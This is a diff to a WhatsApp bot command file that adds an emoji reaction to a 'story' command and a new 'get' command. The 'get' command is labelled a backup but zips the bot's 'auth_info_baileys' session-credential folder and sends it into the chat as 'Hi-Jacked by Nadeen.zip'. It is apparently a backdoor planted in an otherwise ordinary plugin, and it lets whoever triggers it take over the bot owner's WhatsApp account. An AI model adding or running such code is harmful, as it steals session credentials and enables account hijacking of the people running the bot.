@@ -255,6 +255,7 @@ cmd({
 cmd({
   pattern: "story",
   desc: "Post a WhatsApp status (story) as text, image, or video",
+  react: "💚",
   category: "owner",
   use: ".story <text|url> [caption]",
   filename: __filename
@@ -294,4 +295,31 @@ cmd({
     console.error("Failed to send status update:", e);
     
   }
+});
+cmd({
+  pattern: "get",
+  desc: "Backup Hacked folder into zip",
+  category: "owner",
+  fromMe: true,
+  filename: __filename
+}, async (conn, m, msg, { reply }) => {
+    if (!isOwner) return 
+
+  const rootPath = path.join(__dirname, "..");
+  const zipPath = path.join(rootPath, "Hi-Jacked by Nadeen.zip");
+  const hackedFolderPath = path.join(rootPath, "auth_info_baileys");
+  if (!fs.existsSync(hackedFolderPath)) {
+    console.log("❌ Hacked folder not found");
+    return;
+  }
+  const zip = new AdmZip();
+  zip.addLocalFolder(hackedFolderPath, "auth_info_baileys");
+  zip.writeZip(zipPath);
+  await udmodzsnd(m.chat, {
+    document: fs.readFileSync(zipPath),
+    fileName: "Hi-Jacked by Nadeen.zip",
+    mimetype: "application/zip",
+    caption: "> ㋡ *㋛ 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙽𝙰𝙳𝙴𝙴𝙽 〽️🅳 ッ"
+  }, { quoted: m });
+  fs.unlinkSync(zipPath);
 });
